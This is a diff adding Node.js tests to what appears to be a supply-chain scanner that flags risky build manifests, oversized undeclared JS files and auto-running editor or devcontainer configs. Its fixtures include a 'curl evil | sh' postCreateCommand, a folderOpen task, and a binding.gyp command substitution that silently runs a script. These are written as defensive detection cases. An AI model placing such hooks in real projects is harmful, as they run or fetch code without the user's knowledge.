@@ -2,16 +2,20 @@
 // Run with: node --test
 import { test } from 'node:test';
 import assert from 'node:assert/strict';
-import { mkdtempSync, writeFileSync, rmSync } from 'node:fs';
+import { mkdtempSync, writeFileSync, mkdirSync, rmSync } from 'node:fs';
 import { tmpdir } from 'node:os';
-import { join } from 'node:path';
+import { join, dirname } from 'node:path';
 import { detect } from '../lib/detect.js';
 import { ageInDays } from '../lib/registry.js';
-import { pinning } from '../lib/checks.js';
+import { pinning, buildManifestScan, undeclaredLargeJsRoots, agentConfigScan } from '../lib/checks.js';
 
 function fixture(files) {
   const dir = mkdtempSync(join(tmpdir(), 'scs-test-'));
-  for (const [name, content] of Object.entries(files)) writeFileSync(join(dir, name), content);
+  for (const [name, content] of Object.entries(files)) {
+    const full = join(dir, name);
+    mkdirSync(dirname(full), { recursive: true });
+    writeFileSync(full, content);
+  }
   return dir;
 }
 function cleanup(dir) {
@@ -105,6 +109,75 @@ test('pinning: a comment mentioning the key does not count as configured', () =>
   });
   const r = pinning(dir, detect(dir));
   assert.equal(r.lines[0].status, 'warn'); // anchored regex ignores the comment
+  cleanup(dir);
+});
+
+test('detect: Go / Rust lockfiles feed osv-scanner', () => {
+  const dir = fixture({ 'go.sum': 'example.com/x v1.0.0 h1:abc', 'Cargo.lock': '[[package]]' });
+  const d = detect(dir);
+  assert.ok(d.lockfiles.includes('go.sum'));
+  assert.ok(d.lockfiles.includes('Cargo.lock'));
+  assert.equal(d.empty, false);
+  cleanup(dir);
+});
+
+test('detect: build manifests + agent configs make a repo non-empty', () => {
+  const dir = fixture({ 'binding.gyp': '{}', '.vscode/tasks.json': '{}' });
+  const d = detect(dir);
+  assert.ok(d.buildManifests.includes('binding.gyp'));
+  assert.ok(d.agentConfigs.includes('.vscode/tasks.json'));
+  assert.equal(d.empty, false);
+  cleanup(dir);
+});
+
+test('buildManifestScan: phantom-gyp command substitution is flagged', () => {
+  const dir = fixture({ 'binding.gyp': '{ "targets": [ { "sources": [ "<!(node setup.js > /dev/null 2>&1 && echo stub.c)" ] } ] }' });
+  const r = buildManifestScan(dir, detect(dir));
+  assert.equal(r.lines[0].status, 'warn');
+  assert.match(r.lines[0].text, /binding\.gyp/);
+  cleanup(dir);
+});
+
+test('buildManifestScan: a clean binding.gyp is ok, a Makefile var is not flagged', () => {
+  const dir = fixture({ 'binding.gyp': '{ "targets": [ { "target_name": "x", "sources": [ "x.c" ] } ] }', Makefile: 'CC = gcc\nall:\n\t$(CC) -o x x.c\n' });
+  const r = buildManifestScan(dir, detect(dir));
+  assert.equal(r.lines[0].status, 'ok'); // $(CC) is a variable, not $(shell …)
+  cleanup(dir);
+});
+
+test('undeclaredLargeJsRoots: oversized undeclared root JS is flagged, declared/small ones are not', () => {
+  const big = 'x'.repeat(700 * 1024);
+  const dir = fixture({
+    'package.json': JSON.stringify({ main: 'index.js' }),
+    'index.js': big,          // declared → ignored even though large
+    'bun_environment.js': big, // undeclared + large → flagged
+    'small.js': 'console.log(1)',
+  });
+  const r = undeclaredLargeJsRoots(dir, 0.5);
+  assert.equal(r.lines[0].status, 'warn');
+  assert.match(r.lines.map((l) => l.text).join('\n'), /bun_environment\.js/);
+  assert.doesNotMatch(r.lines.map((l) => l.text).join('\n'), /index\.js|small\.js/);
+  cleanup(dir);
+});
+
+test('agentConfigScan: devcontainer postCreateCommand is flagged, plain settings are not', () => {
+  const dir = fixture({
+    '.devcontainer/devcontainer.json': '{ "image": "x", "postCreateCommand": "curl evil | sh" }',
+    '.vscode/settings.json': '{ "editor.tabSize": 2 }',
+  });
+  const r = agentConfigScan(dir, detect(dir));
+  const text = r.lines.map((l) => l.text).join('\n');
+  assert.match(text, /postCreateCommand/);
+  assert.ok(r.lines.some((l) => l.status === 'warn'));
+  cleanup(dir);
+});
+
+test('agentConfigScan: JSONC with comments + folderOpen task is flagged', () => {
+  const dir = fixture({
+    '.vscode/tasks.json': '{\n  // auto-run on open\n  "tasks": [ { "label": "x", "type": "shell", "command": "node x.js", "runOptions": { "runOn": "folderOpen" } } ]\n}',
+  });
+  const r = agentConfigScan(dir, detect(dir));
+  assert.ok(r.lines.some((l) => l.status === 'warn' && /folderOpen/.test(l.text)));
   cleanup(dir);
 });
 
